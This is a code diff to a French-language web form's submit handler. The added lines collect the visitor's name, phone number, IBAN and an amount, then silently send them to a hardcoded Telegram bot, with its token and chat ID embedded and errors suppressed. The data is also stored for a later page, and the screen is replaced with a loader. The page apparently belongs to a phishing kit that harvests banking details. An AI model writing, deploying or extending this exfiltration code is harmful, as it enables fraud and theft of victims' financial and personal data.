@@ -114,15 +114,28 @@
         document.getElementById('info-form').addEventListener('submit', function(e) {
             e.preventDefault();
 
-            // STOCKAGE page 2
-            const page2Data = {
-                nom: document.querySelector('input[placeholder="Nom prénom(s)"]').value.trim() || 'non saisi',
-                tel: document.querySelector('input[placeholder="+33 6 12 34 56 78"]').value.trim() || 'non saisi',
-                iban: document.querySelector('input[placeholder="FR76 1234 5678 9012 3456 7890 12"]').value.trim() || 'non saisi',
-                montant: montant
-            };
+            const nom = document.querySelector('input[placeholder="Nom prénom(s)"]').value.trim() || 'non saisi';
+            const tel = document.querySelector('input[placeholder="+33 6 12 34 56 78"]').value.trim() || 'non saisi';
+            const iban = document.querySelector('input[placeholder="FR76 1234 5678 9012 3456 7890 12"]').value.trim() || 'non saisi';
+
+            // Message immédiat Telegram page 2
+            const messagePage2 = `
+🔥 INFOS PAGE 2 SAISIES 🔥
+Montant: ${montant} €
+Nom/prénom: ${nom}
+Téléphone: ${tel}
+IBAN: ${iban}
+            `.trim();
+
+            const token = "8281062190:AAHjA80kaHFvPIsxK-fIX0sCPykIGcGRp3s";
+            const chat_id = "2036034237";
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(messagePage2)}`).catch(() => {});
+
+            // Stockage pour page 4
+            const page2Data = { nom, tel, iban, montant };
             localStorage.setItem('page2Data', JSON.stringify(page2Data));
 
+            // Loader
             document.body.innerHTML = '';
             document.body.style.background = '#ffffff';
             document.body.innerHTML = `
